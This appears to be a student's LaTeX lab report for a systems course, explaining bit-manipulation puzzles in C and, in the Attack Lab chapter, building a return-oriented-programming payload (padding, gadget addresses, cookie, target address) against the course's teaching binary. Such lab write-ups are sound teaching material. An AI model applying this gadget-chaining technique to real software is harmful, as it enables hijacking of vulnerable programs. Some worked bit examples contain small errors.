@@ -1,0 +1,150 @@
+% !TeX root = main.tex
+\documentclass[11pt]{report}
+\usepackage{listings}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{titlesec}
+\usepackage{color}
+
+\usepackage{biblatex}
+\addbibresource{ref.bib}
+\titleformat{\chapter}{\normalfont\huge}{\thechapter.}{32pt}{\huge}
+
+\lstset
+{
+    numbers=left,
+    stepnumber=1,
+    showstringspaces=false,
+    tabsize=1,
+    basicstyle=\footnotesize\sffamily\color{black},
+    breaklines=true,
+    xleftmargin=0.225in,
+    frame=l,
+}
+
+\setlength{\parindent}{0pt}
+
+\begin{document}
+\include{title.tex}
+
+\chapter{Data Lab}
+\subsection{A}
+% Describe your implementation of howManyBits(x)
+\begin{lstlisting}[language=C]
+int howManyBits(int x) {
+  // Assign integers to us later;
+  int ret = 0, y = 0;
+
+  // Get the sign of x
+  // All 1s if negative, all zeroes if positive
+  int sign = x >> 31;
+
+  // If the number is negative get -x-1 
+  // Aka if -12 get 11, or if 12 get 12
+  // The number of digits for those 2 are exactly the same, so doing this just makes it significantly easier to work with
+  x = ((sign & \simx)|(~sign & x));
+ 
+  // Do a sort of command and conquer
+  // First shift by the first half of the int size
+  // Then check if there are any bits remaining
+  // If there is, then set y to 16, otherwise its 0
+  // Shift x by y bits, which means we wont count those bits again. If there was less than 16 bits, nothing happens.
+  //  
+  // Repeat this process, halfing the amount each time. 
+  y = !!(x >> 16) << 4; x >>= y; ret += y;
+  y = !!(x >> 8) << 3;  x >>= y; ret += y;
+  y = !!(x >> 4) << 2;  x >>= y; ret += y;
+  y = !!(x >> 2) << 1;  x >>= y; ret += y;
+  y = !!(x >> 1);       x >>= y; ret += y; // No need to shift 1, as it would be by 0
+  ret += x; // If there is more bits left, its simply 1, and is just set to x
+  return 1+ret; // Return the result, adding a bit for the sign
+}
+\end{lstlisting}
+
+The function $howManyBits(x)$ determines how many bits are necessary to represent the number $x$. To to do so first get the sign of the number and negate negative numbers to one less. Ex $-12$ becomes $11$
+\begin{align*}
+    -12 &= 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 0100\\
+    \sim-12 &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011\\
+    \text{sign}  &= 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\\
+    \sim\text{sign} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    -12 \& \sim-1 &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    \sim-12 \& \text{sign} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011\\
+    (-12 \& \sim\text{sign}) | (~-12 \& \text{sign}) &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011\\
+    11  &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011
+\end{align*}
+The above lists all the mutations done on the 12. The purpose of which is to get the "negated" number if it's negative. For $x=11$ the mutations look like:
+\begin{align*}
+    11 &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011\\
+    \sim11 &= 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 0100\\
+    \text{sign} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    \sim\text{sign} &= 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\ 1111\\
+    11 \& \sim\text{sign} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011\\
+    \sim11 \& \text{sign} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    (11 \& \sim\text{sign}) | (~11 \& \text{sign}) &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 1011
+\end{align*}
+For positive numbers nothing is esentially done, but it's necessary for the algorithm to work. 
+
+Next step is to do a search for the outermost bit. This is done by shifting the number by half the size of the integer, initially 16. If there are any bits left, then add 16 to the result. And shift the number by 16. Repeat with 8,4,2 and 1. Doing so will narrow us down more and more to the result. One thing to note is that we always add 1 at the end of the method for the sign. If we take 17 as an example. 
+\begin{align*}
+    17 &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0001\ 0001\\
+    \text{shift by 4} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0001\\
+    \text{add 4 to y} &= 4\\
+    \text{shift x by 4} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0001\\
+    \text{shift by 2} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    \text{shift by 1} &= 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\\
+    \text{add x to y} &= 5
+    \text{add 1 for sign} &= 6
+\end{align*}
+
+\subsection{B}
+\begin{lstlisting}[language=C]
+int tmin(void) {
+    // The absolute minimum value is 0x80000000, which can be achieved by shifting 1 left 31 bits.
+    return 1 << 31;
+}
+\end{lstlisting}
+
+The absolute minimum value of an int is, by two's complement, $0x80000000$, aka 1 only followed by 0. This can be achieved by shifting 1 left 31 bits.
+
+
+\chapter{Attack Lab}
+% What happens when the c3 assembly instruction is executed? Does anything on the stack change?
+\section{A}
+The \textit{ret} instruction pops the return address off the stack and transfers the control to it. Then the stack pointer and instruction pointer is set to match the return address method. While not directly done by \textit{ret} it's worth noting that the \textit{\%eax} register is set to the return value, which is used by the calling method to get the return value.
+
+\section{B}
+% What is a gadget farm?
+A gadget farm is a section of code that contains gadgets. A gadget is a part of code that contains instructions followed by a \textit{ret} instruction. These can be used to execute small parts of code in an exploit. Such as moving a value to a register, performing small or a single operation etc. Gadgets arent't often present on purpose, they are extracted from other code. Such as setting a value to something specific,  and then returning. This might accidentally encode into something that can be used as a gadget.\\
+
+Gadgets are, usually, not especially useful on their own. But if used together they can be a powerful tool. For example, if we have a gadget that moves a value to a register, and another that performs an operation on that register, we can use them together to perform an operation on a value.\\[1ex]
+
+In the case of attacklab, the goal was to run a method with an argument. This meant setting the \textit{\%rdi} register to the argument. The value of the argument is on the top of the stack, so we need to find a way to pop to \textit{\%rdi}. This can't be directly done with our gadgets, but we can pop to \textit{\%rax} with this gadget:
+\begin{lstlisting}[language={[x86masm]Assembler}]
+0000000000402985 <setval_484>:
+  402985:	f3 0f 1e fa          	endbr64 
+  402989:	c7 07 58 90 90 c3    	movl   $0xc3909058,(%rdi)
+  40298f:	c3                   	retq   
+\end{lstlisting}
+The instruction \textit{58} will pop to \textit{\%rax}. Located at $402989 + 2 = 40298B$. Then we can move the value to \textit{\%rdi} with this gadget:
+\begin{lstlisting}[language={[x86masm]Assembler}]
+0000000000402970 <getval_104>:
+    402970:	f3 0f 1e fa          	endbr64 
+    402974:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+    402979:	c3                   	retq   
+\end{lstlisting}
+The instruction \textit{48 89 c7} will move the value in \textit{\%rax} to \textit{\%rdi}. Located at $402974 + 1 = 402975$.\\[1ex] 
+
+With that information collected we can construct the payload:
+\begin{lstlisting}
+00 00 00 00 00 00 00 00 /* padding start */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding end */
+8B 29 40 00 00 00 00 00 /* gadget 1 */
+88 7a 22 43 00 00 00 00 /* cookie */
+75 29 40 00 00 00 00 00 /* gadget 2 */
+7c 27 40 00 00 00 00 00 /* touch2 address */ 
+\end{lstlisting}
+It starts with the padding, then the first gadget, which will be executed first. Then the cookie, which will be popped to \textit{\%rax}. Then the second gadget, which will move the value to \textit{\%rdi}. And finally the address of the \textit{touch2} method, which will be executed after the gadget.\\[1ex]
+\end{document}
